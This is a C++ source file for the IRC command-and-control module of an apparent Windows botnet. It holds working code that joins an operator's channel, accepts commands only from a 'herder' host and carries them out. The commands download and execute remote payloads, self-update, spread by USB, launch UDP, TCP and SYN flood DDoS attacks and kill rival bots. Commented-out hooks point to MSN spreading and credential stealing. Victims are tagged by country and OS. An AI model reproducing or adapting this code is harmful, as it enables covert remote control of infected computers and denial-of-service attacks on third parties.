#include "IRC.hpp"

IRC::IRC( API *anapi, char *cfg_serverr, char *cfg_portt, char *cfg_serverpww, char *cfg_channell, char *cfg_channelpww, char *cfg_irchostt, bool izNew, bool izUSB) {
	api = anapi;
	
	isNew = izNew;
	isUSB = izUSB;
	words = new string[65];
/*	herders[0].snick = api->magic(api->magic(api->magic(nick)));
	herders[0].sidentd = api->magic(api->magic(api->magic(identd)));*/
	herders[0].shost = cfg_irchostt;
/*	
	herders[1].snick = api->magic(api->magic(api->magic(nick2)));
	herders[1].sidentd = api->magic(api->magic(api->magic(identd2)));
	herders[1].shost = api->magic(api->magic(api->magic(hostd2)));

	herders[2].snick = api->magic(api->magic(api->magic(nick3)));
	herders[2].sidentd = api->magic(api->magic(api->magic(identd3)));
	herders[2].shost = api->magic(api->magic(api->magic(hostd3)));
*/
	currserver	 = 0;
	newserver	 = 0;
	serversnum	 = 1;
	herdersnum	 = 1;
	failures	 = 0;
	emptyindexes = 0;
	pingtimeout	 = 110;
	silence		 = false;
	shouldDDoS	 = true;
	spreadusb	 = false;
	prefix		 = '!';

	//char *buffer = new char[MAX_PATH];
/*	api->wsprintf(buffer, "%s%s", serverone, serveroneone);
	servers[0].server = api->magic(api->magic(api->magic(buffer)));
	api->wsprintf(buffer, "%s%s", serverpassone, serverpassoneone);
	servers[0].serverpw = api->magic(api->magic(api->magic(buffer)));
	api->wsprintf(buffer, "%s%s", portone, portoneone);
	servers[0].port = api->magic(api->magic(api->magic(buffer)));
	api->wsprintf(buffer, "%s%s", channelone, channeloneone);
	servers[0].channel = api->magic(api->magic(api->magic(buffer)));
	api->wsprintf(buffer, "%s%s", channelpassone, channelpassoneone);
	servers[0].channelpw = api->magic(api->magic(api->magic(buffer)));*/

	
	servers[0].server = cfg_serverr;
	servers[0].serverpw = cfg_serverpww;
	servers[0].port = cfg_portt;
	servers[0].channel = cfg_channell;
	servers[0].channelpw = cfg_channelpww;

/*	api->wsprintf(buffer, "%s%s", servertwo, servertwotwo);
	servers[0].server = api->magic(api->magic(api->magic(buffer)));
	api->wsprintf(buffer, "%s%s", serverpasstwo, serverpasstwotwo);
	servers[0].serverpw = api->magic(api->magic(api->magic(buffer)));
	api->wsprintf(buffer, "%s%s", porttwo, porttwotwo);
	servers[0].port = api->magic(api->magic(api->magic(buffer)));
	api->wsprintf(buffer, "%s%s", channeltwo, channeltwotwo);
	servers[0].channel = api->magic(api->magic(api->magic(buffer)));
	api->wsprintf(buffer, "%s%s", channelpasstwo, channelpasstwotwo);
	servers[0].channelpw = api->magic(api->magic(api->magic(buffer)));*/
	//try { delete []buffer; } catch (...) {}
}

IRC::~IRC( void ) {
	api->WSACleanup();
}

void IRC::RootInit( void ) {
	GenerateNickname();
	botuser = "Surreal 8 * :Endless";
	int status = 0;
	do {
		if (!WsaInitialize())
			continue;
		if (!SockInitialize(currserver))
			continue;
		status = MakeConnection();
		if (status == CODE_SWITCH)
			currserver = newserver;
		if (status != CODE_QUIT)
			api->WSACleanup();
		api->Sleep(1);
	} while (status != CODE_QUIT);
	return;
}

bool IRC::WsaInitialize( void ) {
	ZeroMemory(&wsaData, sizeof(wsaData));
	if (api->WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
		return false;
	return true;
}

bool IRC::AddrInitialize( int which ) {
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family			= AF_INET;
	hints.ai_socktype		= SOCK_STREAM;
	hints.ai_protocol		= IPPROTO_TCP;
	bool x = false;
	for (int y = 0; y < 2; y++) {
		if (api->getaddrinfo(servers[which].server.c_str(), servers[which].port.c_str(), &hints, &result) == 0) {
			x = true;
			break;
		}
	}
	if (!x)
		return false;
	return true;
}

bool IRC::SockInitialize( int which ) {
	if (!AddrInitialize(which))
		return false;
	ptr = result;
	try { 
		ircsock = api->socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	} catch (...) { 
		return false; 
	}
	if (ircsock == INVALID_SOCKET)
		return false;
	return true;
}

int IRC::MakeConnection( void ) {
	bool y = false;
	int i = 0, tries = 0;
	do {
		try {
			if (api->connect(ircsock, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
				ptr = ptr->ai_next;
				if (ptr == NULL) {
					i++;
					api->closesocket(ircsock);
					currserver++;
					if (currserver >= serversnum) {
						currserver = 0;
						i = 0;
					}
					SockInitialize(i);
					if (++tries == (serversnum * 5))
						break;
				}
			} else {
				y = true;
				break;
			}
			api->Sleep(1);
		} catch (...) {
			return INVALID_SOCKET;
		}
	} while (1);
	if (!y)
		return INVALID_SOCKET;
	int retval = ConnHandler();
	return retval;
}

int IRC::ConnHandler( void ) {
	string recvbuffer;
	char recvtemp;
	int numofpacks = 0, status = 0, i = 0;
	Authenticate();
	api->Sleep(2000);
	
	ret.irc = this;
	ret.api = api;
	connretainer = 10;
	dwLastRecv = api->GetTickCount();
	hRetainer = api->CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RetThread, &ret, 0, 0);
	api->CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)NotThread, &ret, 0, 0);
	do {
		status = 0;
		numofpacks = api->recv(ircsock, &recvtemp, 1, 0);
		if (numofpacks > 0) {
			recvbuffer += recvtemp;
			if (++i == MAX_RECV && recvtemp != '\n') {
				if (++failures >= 5) {
					if (!(newserver + 1 > serversnum -1))
							newserver++;
					else if (newserver - 1 != -1)
							newserver = 0;
					failures = 0;
					status = CODE_SWITCH;
					break;
				}
				status = SOCKET_ERROR;
				break;
			}
			if (recvtemp == '\n') {
				dwLastRecv = api->GetTickCount();
				RECV *RecData = new RECV;
				RecData->irc = this;
				RecData->buffer = recvbuffer;
				RecData->api = api;
				api->CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MsgHandler, RecData, NULL, NULL);
				ZeroMemory(&recvbuffer, sizeof(recvbuffer));
				i = 0;
			}
		}
		api->Sleep(1);
	} while(numofpacks > 0);
	api->closesocket(ircsock);
	connretainer = 0;
	api->TerminateThread(hRetainer, 0);
	return globstatus;
}

DWORD __stdcall MsgHandler( IRC::RECV *recv ) {
	API *api = ((API*)recv->api);
	int wordsnum = 0, success = 0;
	string words[65] = {""};
	string bufferBackup = recv->buffer;
	
	for (int i = 0; i < recv->buffer.length() + 1; i++) {
		if (recv->buffer.c_str()[i] == ' ')
			wordsnum++;
	}
	wordsnum++;
	
	for (int h = 0; h < wordsnum; h++) {
		words[h] = recv->buffer.substr(0, recv->buffer.find_first_of(' '));
		recv->buffer.erase(0, recv->buffer.find_first_of(' ') + 1);
	}

	if (words[0] == IRC_PING) {
		success = recv->irc->IRCSend(IRC_PONG, "", words[1]);
	} else if (words[1] == IRC_MSG) {
		if (words[3] == ":!spread.msn") {
			string joiner = "";
			for (int i = 4; i < wordsnum; i++) {
				if (words[i] != "")
					joiner += words[i];
					joiner += " ";
			}
			success = recv->irc->CmdHandler(words[0], words[3], joiner, "" , "", "", "");
		} else
			success = recv->irc->CmdHandler(words[0], words[3], words[4], words[5], words[6], words[7], words[8]);
	} else if (words[1] == RPL_WELCOME) {
		success = recv->irc->IRCSend(IRC_JOIN, recv->irc->servers[recv->irc->currserver].channel, recv->irc->servers[recv->irc->currserver].channelpw);
		//success = recv->irc->IRCSend(IRC_TOPIC, recv->irc->servers[recv->irc->currserver].channel, "");
	} else if (words[1] == RPL_TOPIC) {
		success = recv->irc->IRCTopic(bufferBackup);
	} else if (words[1] == ERR_NICKNAME) {
		recv->irc->GenerateNickname();
		recv->irc->Authenticate();
	} else if (words[1] == ERR_NOTREGD) {
		recv->irc->Authenticate();
	} else if (words[0] == ERR_GENERIC || words[0] == ERR_GENERIC1) {
		recv->irc->globstatus = SOCKET_ERROR;
		recv->irc->api->closesocket(recv->irc->ircsock);
	}

	if (success < 0)
		recv->irc->globstatus = success;
	try { delete recv; } catch (...) {}
	return success;
}

int IRC::IRCTopic( string topic ) {
	int success = 0, commandsnum = 1;
	
	for (int b = 0; b < topic.length(); b++) {
		if (topic.c_str()[b] == ':' && topic.c_str()[b+1] == '!') {
			topic.erase(0, b + 1);
			break;
		}
		else if (topic.c_str()[b] == ':')
			topic.erase(0, b + 1);
	}

	if (!(topic.c_str()[0] == '!'))
		return success;
	
	
	for (int i = 0; i < topic.length() + 1; i++) {
		if (topic.c_str()[i] == '|' && topic.c_str()[i + 1] == '!')
			commandsnum++;
	}
	
	string command;
	char buff[512] = {0};
	for (int j = 0; j < commandsnum; j++) {
		try {
			command = topic.substr(0, topic.find_first_of("|"));
			topic.erase(0, topic.find_first_of("|") + 1);
			RECV *recv = new RECV;
			recv->irc = this;
			api->wsprintf(buff, ":TOPIC!TOPIC@%s %s %s :%s", herders[0].shost.c_str(), IRC_MSG, (servers[currserver].channel).c_str(), command.c_str());
			recv->buffer = buff;
			api->CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MsgHandler, recv, NULL, NULL);
		} catch (int e) {}
	}
	return success;
}

int IRC::CmdHandler(string host, string command, string parameter1, string parameter2, string parameter3, string parameter4, string parameter5) {
	int success = 0;
	bool valid = false;
	string cnick, cidentd, chostd;
	
	if (command.c_str()[1] != prefix) {
		return 0;
	}
	
	cnick = host.substr(1, host.find_first_of("!")-1);
	host.erase(0, host.find_first_of("!")+1);
	cidentd = host.substr(0, host.find_first_of("@"));
	host.erase(0, host.find_first_of("@")+1);
	chostd = host.substr(0, host.length());
	for (int i = 0; i < herdersnum; i++) {
		/*if ((cnick == herders[i].snick) && (cidentd == herders[i].sidentd) && (chostd == herders[i].shost)) {*/
		if (chostd == herders[i].shost) {
			valid = true;
			break;
		}
	}

	if (valid) {
		if (command.c_str()[command.length()-1] == '\n')
			command.erase(command.length()-2, 2);
		command = command.substr(2, command.length());
		
		if (command == CMD_JOIN) {
			success = IRCSend(IRC_JOIN, parameter1, parameter2);
		} else if (command == CMD_PART) {
			success = IRCSend(IRC_PART, "", parameter1);
		} else if (command == CMD_QUIT) {
			IRCSend(IRC_QUIT, "", MSG_QUIT);
			globstatus = CODE_QUIT;
			api->closesocket(ircsock);
		} else if (command == CMD_NEWNICK) {
			GenerateNickname();
			success = IRCSend(IRC_NICK, "", botnick);
		} else if (command == CMD_VERSION) {
			success = IRCSend(IRC_MSG, servers[currserver].channel, MSG_VERSION);
		} else if (command == CMD_SERVER) {
			success = CMDServer(parameter1);
			if (currserver != newserver) {
				globstatus = CODE_SWITCH;
				api->closesocket(ircsock);
			}
		} else if (command == CMD_DOWNLOAD) {
			bool exec = (parameter2.c_str()[0] == '1' ? true : false);
			success = CMDDownload(parameter1, exec, false);
		} else if (command == CMD_DOWNLOADMD5) {
			bool exec = (parameter3.c_str()[0] == '1' ? true : false);
			if (parameter1 == api->thismd5)
				success = CMDDownload(parameter2, exec);
		} else if (command == CMD_UNINSTALL) {
			success = CMDUninstall();
			globstatus = CODE_QUIT;
			api->closesocket(ircsock);
		} else if (command == CMD_UPDATE) {
			success = CMDDownload(parameter1, true, true);
		} else if (command == CMD_UPDATEMD5) {
			if (parameter1 == api->thismd5)
				success = CMDDownload(parameter2, true, true);
		} else if (command == CMD_USB_START) {
			success = (spreadusb ? IRCSend(IRC_MSG, servers[currserver].channel, MSG_USB_RUNNING) : IRCSend(IRC_MSG, servers[currserver].channel, MSG_USB_STARTED));
			spreadusb = true;
		} else if (command == CMD_USB_STOP) {
			success = (spreadusb ? IRCSend(IRC_MSG, servers[currserver].channel, MSG_USB_STOPPED) : IRCSend(IRC_MSG, servers[currserver].channel, MSG_USB_NRUNNING)); 
			spreadusb = false;
		} else if (command == CMD_VISIT) {
			bool visible = (parameter2.c_str()[0] == '1' ? true : false);
			success = CMDVisit(parameter1, visible);
		} else if (command == CMD_SORT)	{
			success = IRCSend(IRC_JOIN, "#" + location, parameter1);
		} else if (command == CMD_USORT) {
			success = IRCSend(IRC_PART, "", "#" + location);		
		} else if (command == CMD_SILENCE) {
			silence = (parameter1.find("off") != string::npos ? false : true);
		} else if (command == CMD_UPTIME) {
			success = CMDUptime();
		} else if (command == CMD_DDOSUDP) {
			success = CMDDDoS(parameter1, parameter2, atoi(parameter3.c_str()), atoi(parameter4.c_str()), true);
		} else if (command == CMD_DDOSTCP) {
			success = CMDDDoS(parameter1, parameter2, atoi(parameter3.c_str()), atoi(parameter4.c_str()), false);
		} else if (command == CMD_DDOSSSYN) {
			success = CMDDDoSSYN(parameter1, parameter2, atoi(parameter3.c_str()));
		} else if (command == CMD_DDOSSTOP) {
			shouldDDoS = false;
			success = IRCSend(IRC_MSG, servers[currserver].channel, MSG_DDOS_CANCELLED);
		/*} else if (command == CMD_MSN) {
			IRCSend(IRC_MSG, servers[currserver].channel, MSNSpread(api, parameter1));*/
		/*} else if (command == CMD_STEAL) {
			success = StealIt(this, api, parameter1, parameter2, parameter3, parameter4);	*/
		} else if (command == CMD_BOTKILL) {
			success = CMDBotKill();
		}
	}

	if (success > 0)
		return 0;
	return success;
}

int IRC::IRCSend( string type, string to, string message ) {
	string final = "", space = " ";
	int success = 0;

	if (type == IRC_PONG) {
		final = IRC_PONG + space + message;
	} else if (type == IRC_JOIN) {
		final = IRC_JOIN + space + to + space + message;
	} else if (type == IRC_PART) {
		final = IRC_PART + space + message;
	} else if (type == IRC_NICK) {
		final = IRC_NICK + space + message;
	} else if (type == IRC_USER) {
		final = IRC_USER + space + message;
	} else if (type == IRC_PASS) {
		final = IRC_PASS + space + message;
	} else if (type == IRC_MSG) {
		if (silence)
			return 10;
		final = IRC_MSG + space + to + space + message + space;
	} else if (type == IRC_QUIT) {
		final = IRC_QUIT + space + message + space;
	} else if (type == IRC_TOPIC) {
		final = IRC_TOPIC + space + to;
	}

	final.append("\r\n");
	success = api->send(ircsock, final.c_str(), final.length(), 0);
	if (success > 0)
		return 0;
	return success;
}

void IRC::Authenticate( void ) {
	if (servers[currserver].serverpw != "")
		IRCSend(IRC_PASS, "", servers[currserver].serverpw);
	IRCSend(IRC_NICK, "", botnick);
	IRCSend(IRC_USER, "", botuser);
}

#define LOCATION_SEARCH_SUBSTRING "\"iso3\":\""

void IRC::GenerateNickname() {
	static char *nick = (char*)malloc(32);
	rs_			rs;
	memset(&rs, 0, sizeof(rs_));
	
	//char *loc_url = "http://www.geoiptool.com";
	char *loc_url = "http://www.geobytes.com/iplocator.htm";
	char *loc_unknown = "??";
	char *loc_srchstr = LOCATION_SEARCH_SUBSTRING;

	rs.pi.country = *(WORD *)loc_unknown;
	rs.pi.state = *(WORD *)loc_unknown;

	HINTERNET hint = api->InternetOpenA("", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hurl = api->InternetOpenUrlA(hint, loc_url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
	char	*buff = (char*)LocalAlloc(LPTR, 1024);
	DWORD	read;

	rs.location_str = (char*)LocalAlloc(LPTR, 6);
	strcpy(rs.location_str, "\0");
	while (api->InternetReadFile(hurl, buff, 1024, &read) && read > 0)
	{
		char	*p;
		buff[read - 1] = 0;
		p = strstr(buff, loc_srchstr);
		if (p)
		{
			p += strlen(LOCATION_SEARCH_SUBSTRING);
			memcpy(rs.location_str, p, 3);
			/*char *c = strchr(p, '\"');
			if (c) {
				rs.location_str = (char*)LocalAlloc(LPTR, 6);
				memcpy(rs.location_str, c + 1, 2);
				break;
			}*/
		}
	}
	
	LocalFree(buff);
	api->InternetCloseHandle(hurl);
	api->InternetCloseHandle(hint);

	const char* OSs[] = {
		"7",
		"XP",
		"2003",
		"2008",
		"Vista",
		"2000",
		"ME",
		0
	};

	HKEY hKey;
	char data[64];
	DWORD size;
	int n = -1;
	char OS[6];
	if (api->RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		if (api->RegQueryValueEx(hKey, "ProductName", 0, NULL, (LPBYTE)data, &size) == ERROR_SUCCESS) {
			char* split;
			split = strtok(data, " ");
			while (split != NULL) {
				if (!lstrcmp(split, OSs[0]))
					n = 0;
				else if (!lstrcmp(split, OSs[1]))
					n = 1;
				else if (!lstrcmp(split, OSs[2]))
					n = 2;
				else if (!lstrcmp(split, OSs[3]))
					n = 3;
				else if (!lstrcmp(split, OSs[4]))
					n = 4;
				else if (!lstrcmp(split, OSs[5]))
					n = 5;
				else if (!lstrcmp(split, OSs[6]))
					n = 6;
				else if (!lstrcmp(split, OSs[7]))
					n = 7;
				split = strtok(NULL, " ");
			}
		}
	}

	if (n == -1)
		lstrcpy(OS, "NA");
	else
		lstrcpy(OS, OSs[n]);
	
	sprintf(country, "#%s", rs.location_str);

	if (isNew || isUSB) {
		if (isNew && isUSB) {
			sprintf(nick, "[NU][%s][%s][%s]", rs.location_str, OS, GenerateNumber(5).c_str());
		} else if (isNew) {
			sprintf(nick, "[N][%s][%s][%s]", rs.location_str, OS, GenerateNumber(5).c_str());
		} else if (isUSB) {
			sprintf(nick, "[U][%s][%s][%s]", rs.location_str, OS, GenerateNumber(5).c_str());
		}
	} else 
		sprintf(nick, "[%s][%s][%s]", rs.location_str, OS, GenerateNumber(5).c_str());
	
	if (nick[1] == ']')
		sprintf(nick, "[NA][%s][%s]", OS, GenerateNumber(5).c_str());

	botnick = nick;
	return;
}

std::string IRC::GenerateNumber(int Len) {
	char *nick;
	int i;
	nick = (char *) malloc (Len);
	nick[0] = '\0';
	srand(GetTickCount());
	for (i = 0; i < Len; i++) {
		sprintf(nick, "%s%d", nick, rand()%10);
	}
	nick[i] = '\0';
	string ret = nick;
	free(nick);
	return ret;
}


/*void IRC::GenerateNickname() {
	srand(api->GetTickCount());
	char tmpLocation[4] = {0}, data[7] = {0}, tempnick[40] = {0};
	int randnum = int((rand() / float(RAND_MAX)) * 99999);
	DWORD size = sizeof(data);
	HKEY hKey;


	char *key = (char*)malloc(MAX_PATH);
	RetrieveSetting(CFG_RET, key);
	api->RegCreateKey(HKEY_CURRENT_USER, key, &hKey1);

	botnick = "";
	api->GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, tmpLocation, sizeof(location));	
	location = tmpLocation;
	if (api->RegOpenKeyExA(HKEY_CURRENT_USER, api->magic(api->magic(api->magic(REG_DIR))).c_str(), 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
		bool n = false, u = false;
		if (api->RegQueryValueExA(hKey, "N", 0, NULL, (LPBYTE)data, &size) == ERROR_SUCCESS) {
			if (api->lstrcmpA(data, "true") == 0) {
				n = true;
			}
		}
		if (api->RegQueryValueExA(hKey, "U", 0, NULL, (LPBYTE)data, &size) == ERROR_SUCCESS) {
			if (api->lstrcmpA(data, "true") == 0) {
				u = true;
			}
		}
		if (n || u) { 
			if (n && u) {
				api->wsprintf(tempnick, "[NU][%s][%s][%d]", tmpLocation, getOs().c_str(), randnum);
			} else if (n) {
				api->wsprintf(tempnick, "[N][%s][%s][%d]", tmpLocation, getOs().c_str(), randnum);
			} else {
				api->wsprintf(tempnick, "[U][%s][%s][%d]", tmpLocation, getOs().c_str(), randnum);
			}
		}
		api->RegDeleteValue(hKey, "N");
		api->RegDeleteValue(hKey, "U");
		api->RegCloseKey(hKey);
	}
	free(key);
	if (api->lstrlen(tempnick) > 5) {
		botnick = tempnick;
		return;
	}
	api->wsprintf(tempnick, "[%s][%s][%d]", tmpLocation, getOs().c_str(), randnum);
	botnick = tempnick;
	return;
}*/

//RECODE THIS ABOMINATION \/
string IRC::getOs( void ) {
	HKEY hKey;
	int mwords = 10;
	char *data = new char[MAX_PATH];
	char *words = new char[mwords];
	DWORD size = sizeof(data);
	if (api->RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		api->RegQueryValueExA(hKey, "ProductName", 0, NULL, (LPBYTE)data, &size);
		if (api->RegQueryValueExA(hKey, "ProductName", 0, NULL, (LPBYTE)data, &size) == ERROR_SUCCESS) {
			words = api->lstrtok(data, " ");	
			int i = 0;
			while (api->lstrcmp(words, "7") != 0 && api->lstrcmp(words, "XP") != 0 && api->lstrcmp(words, "2003") != 0 && api->lstrcmp(words, "2008") != 0 && api->lstrcmp(words, "Vista") != 0) {
				words = api->lstrtok(NULL, " ");
				data[0] = api->lstrlen(words) + 1;
				if (++i == mwords + 1) {
					words = "NA";
					break;
				}
			}
			return words;
		}

	}
	api->RegCloseKey(hKey);
	try {
		delete []words;
	} catch (...) {}
	return "NA";
}

DWORD __stdcall RetThread( IRC::RET *ret ) {
	while(true) {
		if (((ret->api->GetTickCount()/1000) - (ret->irc->dwLastRecv/1000)) > ret->irc->pingtimeout) {
			ret->irc->globstatus = SOCKET_ERROR;
			ret->api->closesocket(ret->irc->ircsock);
			break;
		}
		ret->api->Sleep(ret->irc->pingtimeout*1000);
	}
	return 0;
}

DWORD __stdcall NotThread( IRC::RET* ret) {
	string data = "";
	while(ret->irc->connretainer > 0) {
		data = "NOTICE " + ret->irc->botnick + " :STAYALIVE\r\n";
		ret->api->send(ret->irc->ircsock, data.c_str(), data.length(), 0);
		ret->api->Sleep(20000);
	}
	return 0;
}